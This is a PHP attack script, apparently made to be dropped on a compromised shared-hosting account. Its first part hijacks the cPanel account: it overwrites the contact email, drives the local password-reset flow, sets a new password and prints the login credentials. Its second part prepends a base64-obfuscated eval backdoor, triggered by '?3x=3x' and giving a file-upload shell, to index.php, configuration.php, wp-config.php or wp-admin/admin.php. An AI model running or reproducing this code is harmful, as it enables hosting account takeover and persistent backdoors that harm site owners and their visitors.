<?php
//  Thank You
set_time_limit(0);
error_reporting(0);

function CurlPage($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}

function CurlPage2($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}


echo'<form method="post">
<input type="text" name="email" value="" />
<input type="submit" value="get" name="get" />
</form>';
echo'<form method="post">
<input type="text" name="code" value="" />
<input type="submit" value="get2" name="get2" />
</form>';

$g = $_POST['get'];
$email = $_POST['email'];
$g2 = $_POST['get2'];
$codeSC = $_POST['code'];

if(isset($g) && $email != ""){
	$ip = "http://localhost:2082";
	$cpanel = CurlPage2($ip);
	if(!(preg_match("/resetpass/",$cpanel))){die ('Error-one');}
	$pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
		}
	}
	preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
	$home = $m2[1][0];
	fwrite(fopen("/home$home$usr/.contactemail","w"),$email);fwrite(fopen("/home$home$usr/.cpanel/contactinfo","w"),'email:'.$email);
	$postLogin = array( 'user' => $usr , 'login' => 'Reset+Password');
	$login = CurlPage("$ip/resetpass",$postLogin);
	if(preg_match("/error-resetpass-disabled/",$login)){die ('Error-one');}
	$postSendSecurityCode = array( 'action' => 'puzzle' , 'user' => $usr , 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email, 'login' => 'Send+Security+Code');
	$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	if(preg_match("/warn-invalid-answer-puzzle/",$sendSecurityCode)){
		unlink("/home$home$usr/.contactemail");unlink("/home$home$usr/.cpanel/contactinfo");
		fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
		$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	}
echo "\n<br> ./Done";
}

if(isset($g2) && $codeSC != ""){
	$pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
		}
	}
	$domain = $_SERVER['HTTP_HOST'];
	$ip = "http://localhost:2082";
	if(strstr($domain, 'www.')){
		$domain = str_replace("www.","",$domain);
	}else{
		$domain = $domain;
	}
	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
	$injCode = CurlPage("$ip/resetpass",$postCode);
	$newpass = "itachi".substr(str_shuffle("abcdefSTUVWXYZ"),5);
	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
	$injPassword = CurlPage("$ip/resetpass",$postPassword);
	$postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
	$login = CurlPage("$ip/login/",$postLogin);
	if(preg_match("/filemanager/",$login)){
		echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
	}else{
		echo "Error-two\n";
	}
}

?>

<?php

$root=$_SERVER["DOCUMENT_ROOT"];
if(file_exists($root."/index.php") OR file_exists($root."/configuration.php") OR file_exists($root."/wp-config.php")) {
  $index=file_get_contents($root."/index.php");
  $configuration=file_get_contents($root."/configuration.php");
  $wpconfig=file_get_contents($root."/wp-config.php");
  if(!empty($index)) {
    $index=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$index);
    unlink($root."/index.php");
    $opindex=fopen($root."/index.php","a");
    fwrite($opindex,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
    fwrite($opindex,$index);
    fclose($opindex);
    $indexback=$_SERVER['SERVER_NAME']."/index.php?3x=3x";
  }
  if(!empty($configuration)) {
    $configuration=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$config);
    unlink($root."/configuration.php");
    $opcon=fopen($root."/configuration.php","a");
    fwrite($opcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
    fwrite($opcon,$configuration);
    fclose($opcon);
    $configurationback=$_SERVER['SERVER_NAME']."/configuration.php?3x=3x";
  }
  if(!empty($wpconfig)) {
    $wpconfig=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$wpconfig);
    if(is_dir($root."/wp-admin")) {
      chdir($root."wp-admin");
      if(!empty("admin.php")) {
        $about=file_get_contents($root."/wp-admin/admin.php");
        $about=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$about);
        unlink($root."/wp-admin/admin.php");
        $opabout=fopen($root."/wp-admin/admin.php","a");
        fwrite($opabout,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
        fwrite($opabout,$about);
        fclose($opabout);
        $wpadminback=$_SERVER['SERVER_NAME']."/wp-admin/admin.php?3x=3x";
      }
    } else {
      unlink($root."/wp-config.php");
      $opwpcon=fopen($root."/wp-config.php","a");
      fwrite($opwpcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
      fwrite($opwpcon,$wpconfig);
      fclose($opwpcon);
      $wpconfigback=$_SERVER['SERVER_NAME']."/wp-config.php?3x=3x";
    }
  }
}
